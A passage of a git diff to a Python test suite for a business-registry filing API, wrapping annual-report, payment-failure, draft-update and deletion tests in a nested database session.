-    assert rv.json['filing']['header']['status'] == 'DRAFT'
+        filing_id = rv.json['filing']['header']['filingId']
+        rv = client.patch(f'/api/v2/businesses/{identifier}/filings/{filing_id}', json={},
+                        headers=create_header(jwt, [STAFF_ROLE], identifier))
+        assert rv.status_code == HTTPStatus.ACCEPTED
+        assert not rv.json.get('errors')
+        assert rv.json['filing']['header'].get('paymentToken', None) is None
+        assert rv.json['filing']['header']['status'] == 'DRAFT'
 
 
 @integration_payment
 def test_post_valid_ar_with_routing_slip(session, client, jwt):
     """Assert that a filing can be completed up to payment."""
-    from legal_api.models import Filing
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['header']['routingSlipNumber'] = '123131332'
+    with nested_session(session):
+        from legal_api.models import Filing
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['header']['routingSlipNumber'] = '123131332'
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    # check return
-    assert rv.status_code == HTTPStatus.CREATED
-    assert not rv.json.get('errors')
-    assert rv.json['filing']['header']['filingId']
-    assert rv.json['filing']['header']['paymentToken']
+        # check return
+        assert rv.status_code == HTTPStatus.CREATED
+        assert not rv.json.get('errors')
+        assert rv.json['filing']['header']['filingId']
+        assert rv.json['filing']['header']['paymentToken']
 
-    # check stored filing
-    filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
-    assert filing
-    assert filing.status == Filing.Status.PENDING.value
+        # check stored filing
+        filing = Filing.get_filing_by_payment_token(rv.json['filing']['header']['paymentToken'])
+        assert filing
+        assert filing.status == Filing.Status.PENDING.value
 
 
 def test_post_valid_ar_failed_payment(monkeypatch, session, client, jwt):
     """Assert that a unpaid filing can be posted."""
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
-                                last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
-    if annual_report_date > datetime.utcnow().date():
-        annual_report_date = datetime.utcnow().date()
-    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['business']['identifier'] = 'CP7654321'
-    ar['filing']['business']['legalType'] = LegalEntity.EntityTypes.COOP.value
+    with nested_session(session):
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
+                                    last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
+        if annual_report_date > datetime.utcnow().date():
+            annual_report_date = datetime.utcnow().date()
+        ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['business']['identifier'] = 'CP7654321'
+        ar['filing']['business']['legalType'] = LegalEntity.EntityTypes.COOP.value
 
-    old_svc = current_app.config.get('PAYMENT_SVC_URL')
-    current_app.config['PAYMENT_SVC_URL'] = 'http://nowhere.localdomain'
+        old_svc = current_app.config.get('PAYMENT_SVC_URL')
+        current_app.config['PAYMENT_SVC_URL'] = 'http://nowhere.localdomain'
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    current_app.config['PAYMENT_SVC_URL'] = old_svc
-    assert rv.status_code == HTTPStatus.PAYMENT_REQUIRED
-    assert rv.json.get('errors')
-    assert rv.json['errors'][0]['message'] == 'unable to create invoice for payment.'
+        current_app.config['PAYMENT_SVC_URL'] = old_svc
+        assert rv.status_code == HTTPStatus.PAYMENT_REQUIRED
+        assert rv.json.get('errors')
+        assert rv.json['errors'][0]['message'] == 'unable to create invoice for payment.'
 
 
 @integration_payment
 def test_cancel_payment_failed_connection_pay_api(monkeypatch, session, client, jwt):
     """Assert that cancel payment failure returns error."""
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    # check return
-    assert rv.status_code == HTTPStatus.CREATED
-    assert not rv.json.get('errors')
-    assert rv.json['filing']['header']['filingId']
-    assert rv.json['filing']['header']['paymentToken']
+        # check return
+        assert rv.status_code == HTTPStatus.CREATED
+        assert not rv.json.get('errors')
+        assert rv.json['filing']['header']['filingId']
+        assert rv.json['filing']['header']['paymentToken']
 
-    filing_id = rv.json['filing']['header']['filingId']
+        filing_id = rv.json['filing']['header']['filingId']
 
-    old_svc = current_app.config.get('PAYMENT_SVC_URL')
-    current_app.config['PAYMENT_SVC_URL'] = 'http://nowhere.localdomain'
+        old_svc = current_app.config.get('PAYMENT_SVC_URL')
+        current_app.config['PAYMENT_SVC_URL'] = 'http://nowhere.localdomain'
 
-    rv = client.patch(f'/api/v2/businesses/{identifier}/filings/{filing_id}',
-                      json={},
-                      headers=create_header(jwt, [STAFF_ROLE], identifier)
-                      )
+        rv = client.patch(f'/api/v2/businesses/{identifier}/filings/{filing_id}',
+                        json={},
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    current_app.config['PAYMENT_SVC_URL'] = old_svc
-    assert rv.status_code == HTTPStatus.INTERNAL_SERVER_ERROR
-    assert rv.json.get('errors')
-    assert rv.json['errors'][0]['message'] == 'Unable to cancel payment for the filing.'
+        current_app.config['PAYMENT_SVC_URL'] = old_svc
+        assert rv.status_code == HTTPStatus.INTERNAL_SERVER_ERROR
+        assert rv.json.get('errors')
+        assert rv.json['errors'][0]['message'] == 'Unable to cancel payment for the filing.'
 
 
 @integration_payment
 def test_update_annual_report_to_a_business(session, client, jwt):
     """Assert that a filing can be updated if not paid."""
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['header']['date'] = (datetime.utcnow().date() - datedelta.MONTH).isoformat()
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
-    filings = factory_filing(legal_entity, ar)
-    ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['header']['date'] = (datetime.utcnow().date() - datedelta.MONTH).isoformat()
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+        filings = factory_filing(legal_entity, ar)
+        ar['filing']['header']['date'] = datetime.utcnow().date().isoformat()
 
-    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
-                    json=ar,
-                    headers=create_header(jwt, [STAFF_ROLE], identifier)
-                    )
+        rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    ar['filing']['header']['submitter'] = identifier
-    ar['filing']['header']['date'] = rv.json['filing']['header']['date']
-    assert rv.status_code == HTTPStatus.ACCEPTED
-    assert rv.json['filing']['business'] == ar['filing']['business']
-    assert rv.json['filing']['annualReport'] == ar['filing']['annualReport']
-    assert rv.json['filing']['header']['filingId']
-    assert rv.json['filing']['header']['submitter']
-    assert rv.json['filing']['header']['paymentToken']
+        ar['filing']['header']['submitter'] = identifier
+        ar['filing']['header']['date'] = rv.json['filing']['header']['date']
+        assert rv.status_code == HTTPStatus.ACCEPTED
+        assert rv.json['filing']['business'] == ar['filing']['business']
+        assert rv.json['filing']['annualReport'] == ar['filing']['annualReport']
+        assert rv.json['filing']['header']['filingId']
+        assert rv.json['filing']['header']['submitter']
+        assert rv.json['filing']['header']['paymentToken']
 
 
 @integration_payment
 def test_payment_failed(session, client, jwt):
     """Assert that a failed call to a BCOL payment returns an error code and message."""
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    old_svc = current_app.config.get('PAYMENT_SVC_URL')
-    current_app.config['PAYMENT_SVC_URL'] = old_svc + '?__code=400'
+        old_svc = current_app.config.get('PAYMENT_SVC_URL')
+        current_app.config['PAYMENT_SVC_URL'] = old_svc + '?__code=400'
 
-    rv = client.post(f'/api/v2/businesses/{identifier}/filings',
-                     json=ar,
-                     headers=create_header(jwt, [STAFF_ROLE], identifier)
-                     )
+        rv = client.post(f'/api/v2/businesses/{identifier}/filings',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    current_app.config['PAYMENT_SVC_URL'] = old_svc
+        current_app.config['PAYMENT_SVC_URL'] = old_svc
 
-    # check return
-    assert rv.status_code == HTTPStatus.PAYMENT_REQUIRED
-    assert rv.json.get('errors')
+        # check return
+        assert rv.status_code == HTTPStatus.PAYMENT_REQUIRED
+        assert rv.json.get('errors')
 
 
 def test_update_draft_ar(session, client, jwt):
     """Assert that a valid filing can be updated to a paid filing."""
-    import copy
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
-    ar = copy.deepcopy(ANNUAL_REPORT)
+    with nested_session(session):
+        import copy
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
+        ar = copy.deepcopy(ANNUAL_REPORT)
 
-    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}?draft=true',
-                    json=ar,
-                    headers=create_header(jwt, [STAFF_ROLE], identifier)
-                    )
+        rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}?draft=true',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.ACCEPTED
-    assert rv.json['filing']['business'] == ar['filing']['business']
-    assert rv.json['filing']['annualReport'] == ar['filing']['annualReport']
-    assert not rv.json['filing']['header'].get('paymentToken')
-    assert rv.json['filing']['header']['filingId'] == filings.id
+        assert rv.status_code == HTTPStatus.ACCEPTED
+        assert rv.json['filing']['business'] == ar['filing']['business']
+        assert rv.json['filing']['annualReport'] == ar['filing']['annualReport']
+        assert not rv.json['filing']['header'].get('paymentToken')
+        assert rv.json['filing']['header']['filingId'] == filings.id
 
 
 def test_delete_filing_in_draft(session, client, jwt):
     """Assert that a draft filing can be deleted."""
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
-    headers = create_header(jwt, [STAFF_ROLE], identifier)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
+        headers = create_header(jwt, [STAFF_ROLE], identifier)
 
-    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
-                       headers=headers
-                       )
+        rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
+                        headers=headers
+                        )
 
-    assert rv.status_code == HTTPStatus.OK
+        assert rv.status_code == HTTPStatus.OK
 
 
 def test_delete_coop_ia_filing_in_draft_with_file_in_minio(session, client, jwt, minio_server):
     """Assert that a draft filing can be deleted."""
-    identifier = 'T1234567'
-    temp_reg = RegistrationBootstrap()
-    temp_reg._identifier = identifier
-    temp_reg.save()
+    with nested_session(session):
+        identifier = 'T1234567'
+        temp_reg = RegistrationBootstrap()
+        temp_reg._identifier = identifier
+        temp_reg.save()
 
-    filing_json = copy.deepcopy(INCORPORATION_FILING_TEMPLATE)
-    filing_json['filing']['business']['legalType'] = 'CP'
-    del filing_json['filing']['incorporationApplication']['offices']['recordsOffice']
-    del filing_json['filing']['incorporationApplication']['parties'][1]
-    del filing_json['filing']['incorporationApplication']['shareStructure']
-    del filing_json['filing']['incorporationApplication']['incorporationAgreement']
-    filing_json['filing']['incorporationApplication']['cooperative'] = {
-        'cooperativeAssociationType': 'CP'
-    }
+        filing_json = copy.deepcopy(INCORPORATION_FILING_TEMPLATE)
+        filing_json['filing']['business']['legalType'] = 'CP'
+        del filing_json['filing']['incorporationApplication']['offices']['recordsOffice']
+        del filing_json['filing']['incorporationApplication']['parties'][1]
+        del filing_json['filing']['incorporationApplication']['shareStructure']
+        del filing_json['filing']['incorporationApplication']['incorporationAgreement']
+        filing_json['filing']['incorporationApplication']['cooperative'] = {
+            'cooperativeAssociationType': 'CP'
+        }
 
-    rules_file_key = _upload_file(letter, invalid=False)
-    memorandum_file_key = _upload_file(letter, invalid=False)
-    filing_json['filing']['incorporationApplication']['cooperative']['rulesFileKey'] = rules_file_key
-    filing_json['filing']['incorporationApplication']['cooperative']['memorandumFileKey'] = memorandum_file_key
-    filing = factory_filing(LegalEntity(), filing_json, filing_type='incorporationApplication')
-    filing.temp_reg = identifier
-    filing.save()
+        rules_file_key = _upload_file(letter, invalid=False)
+        memorandum_file_key = _upload_file(letter, invalid=False)
+        filing_json['filing']['incorporationApplication']['cooperative']['rulesFileKey'] = rules_file_key
+        filing_json['filing']['incorporationApplication']['cooperative']['memorandumFileKey'] = memorandum_file_key
+        filing = factory_filing(LegalEntity(), filing_json, filing_type='incorporationApplication')
+        filing.temp_reg = identifier
+        filing.save()
 
-    headers = create_header(jwt, [STAFF_ROLE], identifier)
-    with patch.object(RegistrationBootstrapService, 'deregister_bootstrap', return_value=HTTPStatus.OK):
-        with patch.object(RegistrationBootstrapService, 'delete_bootstrap', return_value=HTTPStatus.OK):
-            rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)
+        headers = create_header(jwt, [STAFF_ROLE], identifier)
+        with patch.object(RegistrationBootstrapService, 'deregister_bootstrap', return_value=HTTPStatus.OK):
+            with patch.object(RegistrationBootstrapService, 'delete_bootstrap', return_value=HTTPStatus.OK):
+                rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)
 
-            assert rv.status_code == HTTPStatus.OK
-            try:
-                MinioService.get_file_info(rules_file_key)
-            except S3Error as ex:
-                assert ex.code == 'NoSuchKey'
+                assert rv.status_code == HTTPStatus.OK
+                try:
+                    MinioService.get_file_info(rules_file_key)
+                except S3Error as ex:
+                    assert ex.code == 'NoSuchKey'
 
-            try:
-                MinioService.get_file_info(memorandum_file_key)
-            except S3Error as ex:
-                assert ex.code == 'NoSuchKey'
+                try:
+                    MinioService.get_file_info(memorandum_file_key)
+                except S3Error as ex:
+                    assert ex.code == 'NoSuchKey'
 
 
 def test_delete_dissolution_filing_in_draft_with_file_in_minio(session, client, jwt, minio_server):
     """Assert that a draft filing can be deleted."""
-    identifier = 'CP7654321'
+    with nested_session(session):
+        identifier = 'CP7654321'
 
-    b = factory_legal_entity(identifier)
-    filing_json = copy.deepcopy(FILING_HEADER)
-    filing_json['filing']['header']['name'] = 'dissolution'
-    filing_json['filing']['business']['legalType'] = 'CP'
-    filing_json['filing']['dissolution'] = copy.deepcopy(DISSOLUTION)
-    file_key = _upload_file(letter, invalid=False)
-    filing_json['filing']['dissolution']['affidavitFileKey'] = file_key
-    filing = factory_filing(b, filing_json, filing_type='dissolution')
-    headers = create_header(jwt, [STAFF_ROLE], identifier)
-    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)
+        b = factory_legal_entity(identifier)
+        filing_json = copy.deepcopy(FILING_HEADER)
+        filing_json['filing']['header']['name'] = 'dissolution'
+        filing_json['filing']['business']['legalType'] = 'CP'
+        filing_json['filing']['dissolution'] = copy.deepcopy(DISSOLUTION)
+        file_key = _upload_file(letter, invalid=False)
+        filing_json['filing']['dissolution']['affidavitFileKey'] = file_key
+        filing = factory_filing(b, filing_json, filing_type='dissolution')
+        headers = create_header(jwt, [STAFF_ROLE], identifier)
+        rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)
 
-    assert rv.status_code == HTTPStatus.OK
-    try:
-        MinioService.get_file_info(file_key)
-    except S3Error as ex:
-        assert ex.code == 'NoSuchKey'
+        assert rv.status_code == HTTPStatus.OK
+        try:
+            MinioService.get_file_info(file_key)
+        except S3Error as ex:
+            assert ex.code == 'NoSuchKey'
 
 
 def test_delete_filing_block_completed(session, client, jwt):
     """Assert that a completed filing cannot be deleted."""
-    import copy
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        import copy
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    filings = factory_completed_filing(legal_entity, ar)
+        filings = factory_completed_filing(legal_entity, ar)
 
-    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
-                       headers=create_header(jwt, [STAFF_ROLE], identifier)
-                       )
+        rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.FORBIDDEN
+        assert rv.status_code == HTTPStatus.FORBIDDEN
 
 
 def test_delete_filing_no_filing_id(client, jwt):
@@ -801,14 +834,15 @@ def test_delete_filing_missing_filing_id(client, jwt):
 
 def test_delete_filing_not_authorized(session, client, jwt):
     """Assert that a users is authorized to delete a filing."""
-    identifier = 'CP7654321'
-    b = factory_legal_entity(identifier)
-    filings = factory_filing(b, ANNUAL_REPORT)
-    headers = create_header(jwt, ['BAD ROLE'], identifier)
+    with nested_session(session):
+        identifier = 'CP7654321'
+        b = factory_legal_entity(identifier)
+        filings = factory_filing(b, ANNUAL_REPORT)
+        headers = create_header(jwt, ['BAD ROLE'], identifier)
 
-    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}', headers=headers)
+        rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filings.id}', headers=headers)
 
-    assert rv.status_code == HTTPStatus.UNAUTHORIZED
+        assert rv.status_code == HTTPStatus.UNAUTHORIZED
 
 
 ULC_LTD_DELETION_LOCKED_MESSAGE: Final = 'You must complete this alteration filing to become a BC Benefit Company.'
@@ -840,170 +874,178 @@ GENERIC_DELETION_LOCKED_MESSAGE: Final = 'This filing cannot be deleted at this 
     ])
 def test_deleting_filings_deletion_locked(session, client, jwt, legal_type, deletion_locked, message):
     """Assert that filing cannot be deleted with deletion_locked flag."""
-    identifier = 'BC7654321'
-    legal_entity =factory_legal_entity(identifier, entity_type=legal_type.value)
-    filing = factory_filing(legal_entity, ALTERATION_FILING_TEMPLATE, filing_type='alteration')
+    with nested_session(session):
+        identifier = 'BC7654321'
+        legal_entity =factory_legal_entity(identifier, entity_type=legal_type.value)
+        filing = factory_filing(legal_entity, ALTERATION_FILING_TEMPLATE, filing_type='alteration')
 
-    if deletion_locked:
-        filing.deletion_locked = True
-        filing.save()
+        if deletion_locked:
+            filing.deletion_locked = True
+            filing.save()
 
-    headers = create_header(jwt, [STAFF_ROLE], identifier)
-    rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)
-    if deletion_locked:
-        assert rv.status_code == HTTPStatus.UNAUTHORIZED
-        assert rv.json.get('message') == message
-    else:
-        assert rv.status_code == HTTPStatus.OK
+        headers = create_header(jwt, [STAFF_ROLE], identifier)
+        rv = client.delete(f'/api/v2/businesses/{identifier}/filings/{filing.id}', headers=headers)
+        if deletion_locked:
+            assert rv.status_code == HTTPStatus.UNAUTHORIZED
+            assert rv.json.get('message') == message
+        else:
+            assert rv.status_code == HTTPStatus.OK
 
 
 def test_update_block_ar_update_to_a_paid_filing(session, client, jwt):
     """Assert that a valid filing can NOT be updated once it has been paid."""
-    import copy
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
-                                last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
-    if annual_report_date > datetime.utcnow().date():
-        annual_report_date = datetime.utcnow().date()
-    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        import copy
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
+                                    last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
+        if annual_report_date > datetime.utcnow().date():
+            annual_report_date = datetime.utcnow().date()
+        ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    filings = factory_completed_filing(legal_entity, ar)
+        filings = factory_completed_filing(legal_entity, ar)
 
-    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
-                    json=ar,
-                    headers=create_header(jwt, [STAFF_ROLE], identifier)
-                    )
+        rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id}',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.FORBIDDEN
-    assert rv.json['errors'][0] == {'error': 'Filings cannot be changed after the invoice is created.'}
+        assert rv.status_code == HTTPStatus.FORBIDDEN
+        assert rv.json['errors'][0] == {'error': 'Filings cannot be changed after the invoice is created.'}
 
 
 def test_update_ar_with_a_missing_filing_id_fails(session, client, jwt):
     """Assert that updating a missing filing fails."""
-    import copy
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
-                                last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
-    if annual_report_date > datetime.utcnow().date():
-        annual_report_date = datetime.utcnow().date()
-    ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        import copy
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.datedelta(years=2)),
+                                    last_ar_date=datetime(datetime.utcnow().year - 1, 4, 20).date()
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        annual_report_date = datetime(datetime.utcnow().year, 2, 20).date()
+        if annual_report_date > datetime.utcnow().date():
+            annual_report_date = datetime.utcnow().date()
+        ar['filing']['annualReport']['annualReportDate'] = annual_report_date.isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    filings = factory_completed_filing(legal_entity, ar)
+        filings = factory_completed_filing(legal_entity, ar)
 
-    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
-                    json=ar,
-                    headers=create_header(jwt, [STAFF_ROLE], identifier)
-                    )
+        rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.NOT_FOUND
-    assert rv.json['errors'][0] == {'message': f'{identifier} no filings found'}
+        assert rv.status_code == HTTPStatus.NOT_FOUND
+        assert rv.json['errors'][0] == {'message': f'{identifier} no filings found'}
 
 
 def test_update_ar_with_a_missing_business_id_fails(session, client, jwt):
     """Assert that updating to a non-existant business fails."""
-    import copy
-    identifier = 'CP7654321'
-    legal_entity =factory_legal_entity(identifier,
-                                founding_date=(datetime.utcnow() - datedelta.YEAR)
-                                )
-    factory_legal_entity_mailing_address(legal_entity)
-    ar = copy.deepcopy(ANNUAL_REPORT)
-    ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
-    ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
+    with nested_session(session):
+        import copy
+        identifier = 'CP7654321'
+        legal_entity =factory_legal_entity(identifier,
+                                    founding_date=(datetime.utcnow() - datedelta.YEAR)
+                                    )
+        factory_legal_entity_mailing_address(legal_entity)
+        ar = copy.deepcopy(ANNUAL_REPORT)
+        ar['filing']['annualReport']['annualReportDate'] = datetime.utcnow().date().isoformat()
+        ar['filing']['annualReport']['annualGeneralMeetingDate'] = datetime.utcnow().date().isoformat()
 
-    filings = factory_completed_filing(legal_entity, ar)
-    identifier = 'CP0000001'
+        filings = factory_completed_filing(legal_entity, ar)
+        identifier = 'CP0000001'
 
-    rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
-                    json=ar,
-                    headers=create_header(jwt, [STAFF_ROLE], identifier)
-                    )
+        rv = client.put(f'/api/v2/businesses/{identifier}/filings/{filings.id+1}',
+                        json=ar,
+                        headers=create_header(jwt, [STAFF_ROLE], identifier)
+                        )
 
-    assert rv.status_code == HTTPStatus.BAD_REQUEST
-    assert rv.json['errors'][0] == {'message': 'A valid business is required.'}
+        assert rv.status_code == HTTPStatus.BAD_REQUEST
